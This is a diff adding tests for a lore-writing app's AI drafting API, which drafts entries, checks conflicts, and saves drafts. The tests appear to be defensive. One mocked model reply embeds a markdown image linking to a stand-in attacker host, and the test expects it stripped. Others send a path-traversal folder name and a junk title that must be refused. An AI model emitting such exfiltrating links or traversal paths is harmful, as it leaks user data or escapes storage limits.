@@ -1183,3 +1183,160 @@ describe("discovering what lies at a place", () => {
     expect(bad.statusCode).toBe(400);
   });
 });
+
+describe("drafting an entry from what the author said", () => {
+  const SAID =
+    "Orsolya Tane is a warden of a Nirani port. She signals the ships in with lantern light.";
+  const DRAFT = {
+    title: "Orsolya Tane",
+    folder: "04 Inhabitants",
+    paragraphs: [
+      "Orsolya Tane is a warden of a [[Nirani]] port. ![x](https://evil.example/?d=1)",
+      "She signals the ships in with lantern light.",
+      "She keeps the [[Tide Wardens]].",
+    ],
+    notSaid: ["Her age?", " ", "Which port?"],
+    conflicts: [
+      // Backed: the words are in the entry.
+      { paragraph: 1, path: NIRANI, quote: "keep time by the pulse of the deep currents" },
+      // Not backed: the model made the quote up.
+      { paragraph: 1, path: NIRANI, quote: "The Nirani adore lanterns above all" },
+      // Not a paragraph of the draft.
+      { paragraph: 9, path: NIRANI, quote: "keep time by the pulse of the deep currents" },
+      // An entry that was not read.
+      { paragraph: 0, path: "made/up.md", quote: "keep time by the pulse of the deep currents" },
+    ],
+  };
+  const propose = () => t.post("/api/lore/draft", { said: SAID });
+
+  it("drafts from his words and keeps only the conflicts the lore backs by a quote", async () => {
+    const p = await start([DRAFT]);
+    const res = await propose();
+    expect(res.statusCode, res.body).toBe(200);
+    const d = res.json().draft;
+    expect(d.title).toBe("Orsolya Tane");
+    expect(d.paragraphs[0]).toBe("Orsolya Tane is a warden of a [[Nirani]] port.");
+    expect(d.notSaid).toEqual(["Her age?", "Which port?"]);
+    expect(d.conflicts).toEqual([
+      {
+        paragraph: 1,
+        path: NIRANI,
+        title: "Nirani",
+        quote: "keep time by the pulse of the deep currents",
+      },
+    ]);
+    expect(d.folders[0]).toBe("04 Inhabitants");
+    expect(d.existing).toBeNull();
+    expect(d.given).toContain(NIRANI);
+    expect(d.links).toEqual([
+      { title: "Nirani", exists: true },
+      { title: "Tide Wardens", exists: false },
+    ]);
+    // Only the entries his words named or found are sent, with his words last.
+    const sent = p.calls[0]!.body.messages.map((m) => m.content).join("\n");
+    expect(sent).toContain("=== Entry: " + NIRANI);
+    expect(sent.trim().endsWith(SAID)).toBe(true);
+  });
+
+  it("says when an entry already goes by the title, and offers only folders it may go in", async () => {
+    await start([{ ...DRAFT, title: "Nirani", folder: "99 Appendices", conflicts: [] }]);
+    const d = (await propose()).json().draft;
+    expect(d.existing).toBe(NIRANI);
+    expect(d.folders).not.toContain("99 Appendices");
+    expect(d.folders.length).toBeGreaterThan(0);
+  });
+
+  it("is off without a model, and drafts nothing from an empty answer", async () => {
+    await start([DRAFT], {});
+    const off = await propose();
+    expect(off.statusCode).toBe(409);
+    expect(off.json().error.code).toBe("ai_off");
+    await t.close();
+    await start([{ ...DRAFT, paragraphs: [" "] }]);
+    expect((await propose()).statusCode).toBeGreaterThanOrEqual(400);
+  });
+
+  it("looks again at the one paragraph he changed, and not at the entry it would replace", async () => {
+    const p = await start([
+      { conflicts: [{ path: NIRANI, quote: "keep time by the pulse of the deep currents" }] },
+    ]);
+    const res = await t.post("/api/lore/draft/check", {
+      title: "Nirani",
+      paragraphs: ["First.", "They do not keep time by the pulse of the deep currents."],
+      changed: 1,
+    });
+    expect(res.statusCode, res.body).toBe(200);
+    // The draft is called Nirani, so the entry of that name is not evidence against itself.
+    expect(res.json()).toMatchObject({ conflicts: [], existing: NIRANI });
+    const sent = p.calls[0]!.body.messages.map((m) => m.content).join("\n");
+    expect(sent).not.toContain("=== Entry: " + NIRANI);
+    expect(sent).not.toContain("First.");
+
+    await t.close();
+    await start([
+      { conflicts: [{ path: NIRANI, quote: "keep time by the pulse of the deep currents" }] },
+    ]);
+    const other = (
+      await t.post("/api/lore/draft/check", {
+        title: "Orsolya Tane",
+        paragraphs: ["They do not keep time by the pulse of the deep currents, the Nirani say."],
+        changed: 0,
+      })
+    ).json();
+    expect(other.conflicts).toEqual([
+      {
+        paragraph: 0,
+        path: NIRANI,
+        title: "Nirani",
+        quote: "keep time by the pulse of the deep currents",
+      },
+    ]);
+    // An empty paragraph needs no check, and no call.
+    const empty = await t.post("/api/lore/draft/check", {
+      title: "Orsolya Tane",
+      paragraphs: ["x"],
+      changed: 5,
+    });
+    expect(empty.json().conflicts).toEqual([]);
+  });
+
+  const keep = (body: object) =>
+    t.post("/api/lore/draft/keep", {
+      title: "Orsolya Tane",
+      folder: "04 Inhabitants",
+      paragraphs: ["Orsolya Tane is a warden.", "She signals the ships in."],
+      ...body,
+    });
+
+  it("keeps it as a new entry that waits to be published, marking a line kept against the lore", async () => {
+    await start([DRAFT]);
+    const res = await keep({ againstLore: [{ paragraph: 1, path: NIRANI }] });
+    expect(res.statusCode, res.body).toBe(200);
+    expect(res.json().path).toBe("04 Inhabitants/Orsolya Tane.md");
+    const un = UnpublishedResponse.parse((await t.get("/api/unpublished")).json());
+    const draft = un.drafts.find((d) => d.path === "04 Inhabitants/Orsolya Tane.md")!;
+    expect(draft.kind).toBe("create");
+    expect(draft.text).toBe(
+      "# Orsolya Tane\n\nOrsolya Tane is a warden.\n\n" +
+        "She signals the ships in. <!-- kept against the lore: Nirani -->\n",
+    );
+    expect(draft.origins[0]).toMatchObject({ kind: "lore", model: `openrouter:${MODEL}` });
+    expect(draft.origins[0]).toMatchObject({ ref: expect.stringMatching(/^voice\//) });
+  });
+
+  it("refuses a title that is taken, a place it may not go, and a line kept against nothing", async () => {
+    await start([DRAFT]);
+    expect((await keep({ title: "Nirani" })).statusCode).toBe(403);
+    expect((await keep({ title: "  /:*  " })).statusCode).toBe(400);
+    for (const folder of ["99 Appendices", ".frontier", "04 Inhabitants/../..", "Nowhere"]) {
+      expect((await keep({ folder })).statusCode, folder).toBeGreaterThanOrEqual(400);
+    }
+    expect((await keep({ againstLore: [{ paragraph: 0, path: "made/up.md" }] })).statusCode).toBe(
+      400,
+    );
+    expect((await keep({ againstLore: [{ paragraph: 7, path: NIRANI }] })).statusCode).toBe(400);
+    // A second keep of the same title finds the first.
+    expect((await keep({})).statusCode).toBe(200);
+    expect((await keep({})).statusCode).toBe(403);
+  });
+});
